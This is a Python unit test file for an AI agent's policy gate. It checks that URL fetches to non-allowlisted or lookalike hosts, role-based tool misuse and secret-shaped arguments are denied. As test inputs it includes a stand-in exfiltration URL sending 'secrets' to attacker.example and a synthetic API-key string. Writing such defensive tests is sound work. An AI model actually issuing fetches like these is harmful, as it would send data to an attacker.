"""Harness policy gate: deterministic DENY for egress exfiltration, RBAC tool misuse and secret leakage."""
import unittest

import agent

FAKE_KEY = "nvapi" + "-" + "SYNTHETIC0TESTKEY"  # built at runtime: no key-shaped literal in the repo


def gate(role):
    return agent.PolicyGate(agent.APP_POLICY, role, auto_approve=True)


class PolicyGateTest(unittest.TestCase):
    def test_exfil_to_attacker_host_denied(self):
        ok, reason = gate("analyst").check("fetch_url", {"url": "https://attacker.example/exfil?data=secrets"})
        self.assertFalse(ok)
        self.assertIn("allowlist", reason)

    def test_allowlisted_host_permitted(self):
        ok, _ = gate("analyst").check("fetch_url", {"url": "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"})
        self.assertTrue(ok)

    def test_lookalike_subdomain_denied(self):
        ok, _ = gate("analyst").check("fetch_url", {"url": "https://nvd.nist.gov.attacker.example/x"})
        self.assertFalse(ok)

    def test_viewer_cannot_issue_ticket_or_fetch(self):
        for tool in ["create_incident_ticket", "fetch_url", "check_permission"]:
            with self.subTest(tool=tool):
                ok, _ = gate("viewer").check(tool, {})
                self.assertFalse(ok)

    def test_secret_pattern_in_args_denied(self):
        ok, reason = gate("analyst").check("create_incident_ticket",
                                           {"title": "x", "severity": "low", "summary": "key " + FAKE_KEY})
        self.assertFalse(ok)
        self.assertIn("blocked pattern", reason)

    def test_doc_clearance_mapping(self):
        self.assertEqual(gate("viewer").doc_clearance, frozenset({"all"}))
        self.assertEqual(gate("hr").doc_clearance, frozenset({"all", "hr"}))
        self.assertNotIn("hr", gate("analyst").doc_clearance)

    def test_unknown_role_rejected(self):
        with self.assertRaises(SystemExit):
            gate("root")


if __name__ == "__main__":
    unittest.main()
